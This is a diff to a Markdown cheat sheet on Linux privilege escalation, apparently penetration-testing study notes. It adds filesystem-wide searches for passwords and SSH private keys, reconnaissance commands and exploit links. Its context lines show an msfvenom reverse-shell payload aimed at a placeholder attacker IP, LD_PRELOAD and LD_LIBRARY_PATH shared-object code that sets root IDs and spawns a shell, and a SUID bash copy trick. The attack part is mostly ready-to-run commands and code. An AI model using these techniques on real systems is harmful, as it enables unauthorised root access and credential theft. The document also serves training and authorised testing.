@@ -11,11 +11,8 @@
    * [Wildcards](#Wildcards)
    * [SUID / SGID](#SUID-/-SGID)
    * [Passwords & Keys](#Passwords-&-Keys)
-   * [Root squashing](#Root-squashing)
+   * [NFS](#NFS)
 * [Tips and tricks](#Tips-and-tricks)
-
-
-
 
 ## General tips
 - https://gtfobins.github.io/
@@ -48,6 +45,12 @@ cp /bin/bash /tmp/rootbash sh; chmod +xs /temp/rootbash
 ```
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -f elf > shell.elf
 ```
+  
+#### Other great resources
+- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+- https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+- https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
 
 ## Tools
 #### Ise.sh (favorite from tib3rius)
@@ -77,6 +80,11 @@ whoami; id
 ```
 cat /etc/passwd
 ```
+  
+#### Check sudo commands the current user can use
+```
+sudo -l
+```
 
 #### Check hostname
 ```
@@ -94,16 +102,22 @@ lscpu
 ps aux
 ```
 
-#### Check current privileges
-```
-sudo -l
-```
-
 #### Check networking information
 ```
 ifconfig
 ip a
-routel
+```
+  
+#### Check routes
+```
+route
+ip route4
+```
+  
+#### Check arp tables
+```
+arp -a
+ip neigh
 ```
 
 #### Check open ports
@@ -158,6 +172,14 @@ sudo -u root <PATH TO PROGRAM>
 ./.<PROGRAM> -p 
 ```
 
+#### Check for passwords
+```
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
+grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2>/dev/null
+locate password | more
+find / -name id_rsa 2>/dev/null
+```
+
 ## Privilege escalation techniques
 ### Kernel exploits
 Kernels are the core of any operating system. Think of it as a layer between application software and the actual computer hardware. The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the root user. Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.
@@ -166,6 +188,7 @@ Kernels are the core of any operating system. Think of it as a layer between app
 2. Find matching exploits
    - https://github.com/jondonas/linux-exploit-suggester-2
 3. Compile and run
+   - https://github.com/lucyoa/kernel-exploits
 
 ## Service exploits
 Services are simply programs that run in the background, accepting input or performing regular tasks. If vulnerable services are running as root, exploiting them can lead to command execution as root. Service exploits can be found using Searchsploit, Google, and GitHub, just like with Kernel exploits.
@@ -250,9 +273,9 @@ LD_PRELOAD is an environment variable which can be set to the path of a shared o
 #include <sys/types.h>
 #include <stdlib.h>
 void _init() {
-unsetenv("LD_PRELOAD");
-setresuid(0,0,0);
-system("/bin/bash -p");
+  unsetenv("LD_PRELOAD");
+  setresuid(0,0,0);
+  system("/bin/bash -p");
 }
 ```
 
@@ -263,7 +286,7 @@ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
 
 #### Run any allowed program while setting the LD_Preload environment variable
 ```
-sudo LD_PRELOAD=/tmp/preload.so <PROGRAM
+sudo LD_PRELOAD=/tmp/preload.so <PROGRAM>
 ```
 
 ### LD_LIBRARY_PATH
@@ -280,9 +303,9 @@ ldd /usr/sbin/apache2\
 #include <stdlib.h>
 static void hijack() __attribute__((constructor));
 void hijack() {
-unsetenv("LD_LIBRARY_PATH");
-setresuid(0,0,0);
-system("/bin/bash -p");
+  unsetenv("LD_LIBRARY_PATH");
+  setresuid(0,0,0);
+  system("/bin/bash -p");
 }
 ```
 
@@ -445,6 +468,10 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootb
 ## Passwords & Keys
 While it might seem like a long shot, weak password storage and password re-use can be easy ways to escalate privileges. While the root user’s account password is hashed and stored securely in /etc/shadow, other passwords, such as those for services may be stored in plaintext in config files. If the root user re-used their password for a service, that password may be found and used to switch to the root user.
 
+```
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \
+```
+  
 ### History files
 History files record commands issued by users while they are using certain programs. If a user types a password as part of a command, this password may get stored in a history file. It is always a good idea to try switching to the root user with a discovered password.
 
@@ -464,9 +491,11 @@ SSH keys can be used instead of passwords to authenticate users using SSH. SSH k
 
 ```
 ls -l /.ssh
+find / -name authorized_keys 2>/dev/null
+find / -name id_rsa 2>/dev/null
 ```
 
-### NFS
+## NFS
 NFS (Network File System) is a popular distributed file system. NFS shares are configured in the ```/etc/exports``` file. Remote users can mount shares, access, create, modify files. By default, created files inherit the remote user’s id and group id (as owner and group respectively), even if they don’t exist on the NFS server.
 
 ```
